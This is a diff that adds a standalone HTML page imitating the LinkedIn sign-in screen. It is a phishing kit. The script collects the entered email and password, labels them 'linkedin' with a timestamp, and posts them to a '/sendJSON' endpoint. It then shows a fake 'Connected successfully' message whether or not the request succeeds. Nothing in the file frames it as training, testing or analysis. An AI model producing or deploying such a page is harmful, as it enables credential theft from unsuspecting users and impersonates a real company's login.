@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to LinkedIn</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f3f2ef;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 400px;
+      width: 100%;
+    }
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 24px;
+      box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.08);
+    }
+    .logo-row {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .logo-link {
+      font-size: 28px;
+      font-weight: 700;
+      color: #0a66c2;
+      text-decoration: none;
+      letter-spacing: -0.5px;
+    }
+    .title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #000;
+      margin-bottom: 24px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 16px;
+      border: 1px solid #000;
+      border-radius: 4px;
+      font-size: 16px;
+      font-family: inherit;
+    }
+    .input-field:focus {
+      outline: none;
+      box-shadow: 0 0 0 1px #0a66c2;
+      border-color: #0a66c2;
+    }
+    .input-field::placeholder {
+      color: #666;
+    }
+    .forgot {
+      font-size: 14px;
+      color: #0a66c2;
+      text-decoration: none;
+      font-weight: 600;
+      margin-bottom: 24px;
+      display: inline-block;
+    }
+    .forgot:hover {
+      text-decoration: underline;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: #0a66c2;
+      color: #fff;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+    .submit-btn:hover {
+      background: #004182;
+    }
+    .join-text {
+      text-align: center;
+      font-size: 16px;
+      color: #000;
+    }
+    .join-text a {
+      color: #0a66c2;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .join-text a:hover {
+      text-decoration: underline;
+    }
+    #form-block { }
+    #success-block {
+      display: none;
+      text-align: center;
+      padding: 24px 0;
+    }
+    #success-block .msg {
+      font-size: 16px;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="logo-row">
+        <span class="logo-link">LinkedIn</span>
+      </div>
+      <div id="form-block">
+        <h1 class="title">Sign in</h1>
+        <form id="login-form">
+          <input name="email" class="input-field" type="text" placeholder="Email or phone" required />
+          <input name="password" class="input-field" type="password" placeholder="Password" required />
+          <a href="#" class="forgot">Forgot password?</a>
+          <button type="submit" class="submit-btn">Sign in</button>
+        </form>
+        <p class="join-text">New to LinkedIn? <a href="#">Join now</a></p>
+      </div>
+      <div id="success-block">
+        <p class="msg">Connected successfully.<br />You will be redirected shortly.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      var email = document.querySelector('#login-form input[name="email"]').value.trim();
+      var password = document.querySelector('#login-form input[name="password"]').value;
+
+      var data = {
+        username: email,
+        pwd: password,
+        source: 'linkedin',
+        timestamp: new Date().toISOString()
+      };
+
+      fetch('/sendJSON', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+        .then(function() {
+          document.getElementById('success-block').style.display = 'block';
+          document.getElementById('form-block').style.display = 'none';
+        })
+        .catch(function() {
+          document.getElementById('success-block').style.display = 'block';
+          document.getElementById('form-block').style.display = 'none';
+        });
+    });
+  </script>
+</body>
+</html>
